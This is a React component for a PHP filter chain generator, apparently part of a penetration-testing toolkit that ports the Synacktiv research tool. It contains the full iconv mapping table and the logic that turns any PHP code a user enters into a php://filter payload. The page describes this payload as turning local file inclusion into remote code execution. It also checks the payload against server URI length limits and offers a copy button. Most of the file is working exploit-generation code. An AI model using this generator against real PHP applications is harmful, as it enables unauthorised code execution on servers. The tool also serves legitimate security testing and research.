import React, { useState, useEffect } from 'react';
import { Copy, Check, AlertTriangle } from 'lucide-react';
import { Card } from '../ui';
import { useClipboard } from '../../hooks/useClipboard';

// Original HackTools conversion mappings
const file_to_use = "php://temp";
const conversions: Record<string, string> = {
    "0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
    "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
    "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
    "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
    "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
    "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
    "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
    "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
    "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
    "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
    "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
    "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
    "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
    "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
    "C": "convert.iconv.UTF8.CSISO2022KR",
    "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
    "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
    "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
    "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
    "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
    "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
    "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
    "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
    "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
    "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
    "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
    "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
    "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
    "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
    "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
    "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
    "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
    "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
    "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
    "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
    "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
    "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
    "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
    "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
    "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
    "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
    "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
    "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
    "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
    "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
    "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
    "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
    "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
    "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
    "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
    "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
    "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
    "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
    "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
    "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
    "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
    "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
    "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
    "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
    "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
    "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
    "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
    "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
    "=": "",
};

export default function PHPFilterChainTool() {
    const [chainInput, setChainInput] = useState('');
    const [chainOutput, setChainOutput] = useState('');
    const { copied, copy } = useClipboard();

    // Original HackTools filter chain generation logic
    function generate_filter_chain(chain: string) {
        let filters = "convert.iconv.UTF8.CSISO2022KR|";
        filters += "convert.base64-encode|";
        filters += "convert.iconv.UTF8.UTF7|";

        for (let i = chain.length - 1; i >= 0; i--) {
            const c = chain[i];
            filters += conversions[c] + "|";
            filters += "convert.base64-decode|";
            filters += "convert.base64-encode|";
            filters += "convert.iconv.UTF8.UTF7|";
        }
        filters += "convert.base64-decode";

        const final_payload = `php://filter/${filters}/resource=${file_to_use}`;
        return final_payload;
    }

    useEffect(() => {
        if (chainInput.length === 0) {
            setChainOutput('');
            return;
        }

        const base64_value = btoa(chainInput).replace(/=/g, '');
        const chain = generate_filter_chain(base64_value);
        setChainOutput(chain);
    }, [chainInput]);

    // Server size limits (original HackTools logic)
    const serverLimits: Record<string, number> = {
        "Apache - 8177": 8177,
        "NGINX - 4096": 4096,
        "Microsoft IIS - 16384": 16384,
        "Fastly (CDN) - 8192": 8192,
        "Amazon CloudFront CDN - 8192": 8192,
        "Cloudflare (CDN) - 32768": 32768,
    };

    const exceededServers = Object.entries(serverLimits)
        .filter(([, limit]) => chainOutput.length > limit)
        .map(([server]) => server);

    return (
        <div className="animate-fade-in">
            <div className="mb-6">
                <h2 className="text-2xl font-bold text-white mb-2">PHP Filter Chain Generator</h2>
                <p className="text-gray-400 text-sm leading-relaxed mb-3">
                    This technique is based on the{' '}
                    <a
                        href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-[#a2ff00] hover:underline"
                    >
                        research
                    </a>{' '}
                    done by <b>Rémi Matasse (@remsio-syn from Synacktiv)</b> - all credits go to him.
                </p>
                <p className="text-gray-400 text-sm leading-relaxed">
                    This is an implementation of the original{' '}
                    <a
                        href="https://github.com/synacktiv/php_filter_chain_generator"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-[#a2ff00] hover:underline"
                    >
                        project repository
                    </a>
                    . By using multiple chains of PHP encoding wrappers, this technique can
                    turn file inclusion primitives into remote code execution without upload.
                </p>
            </div>

            <div className="mb-6">
                <label className="block text-sm font-bold text-gray-400 mb-2">
                    PHP Code Input
                </label>
                <input
                    type="text"
                    value={chainInput}
                    onChange={(e) => setChainInput(e.target.value)}
                    placeholder="<?php <php code>; ?> | some extra spaces for padding (may be required)"
                    className="htb-input w-full"
                />
            </div>

            {chainOutput && (
                <Card>
                    <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center gap-3">
                            <h3 className="text-sm font-bold text-[#a2ff00]">
                                Generated Payload ({chainOutput.length} bytes)
                            </h3>
                            {exceededServers.length > 0 && (
                                <div className="flex items-center gap-2 text-xs text-orange-400">
                                    <AlertTriangle size={14} />
                                    <span>May exceed URI limits</span>
                                </div>
                            )}
                        </div>
                        <button
                            onClick={() => copy(chainOutput)}
                            className="flex items-center gap-2 px-3 py-1.5 rounded bg-[#a2ff00]/10 hover:bg-[#a2ff00]/20 text-[#a2ff00] text-xs font-bold transition-colors"
                        >
                            {copied ? <Check size={14} /> : <Copy size={14} />}
                            {copied ? 'Copied!' : 'Copy Payload'}
                        </button>
                    </div>

                    {exceededServers.length > 0 && (
                        <div className="mb-3 p-2 rounded bg-orange-500/10 border border-orange-500/20">
                            <div className="text-xs text-orange-300 font-semibold mb-1">
                                ⚠️ URI Length Warnings:
                            </div>
                            <div className="flex flex-wrap gap-2">
                                {exceededServers.map((server) => (
                                    <span
                                        key={server}
                                        className="px-2 py-1 rounded bg-orange-500/20 text-xs text-orange-200"
                                    >
                                        {server}
                                    </span>
                                ))}
                            </div>
                        </div>
                    )}

                    <div className="bg-[#0d1117] rounded p-3">
                        <code className="text-xs text-blue-300 font-mono break-all">
                            {chainOutput}
                        </code>
                    </div>
                </Card>
            )}
        </div>
    );
}
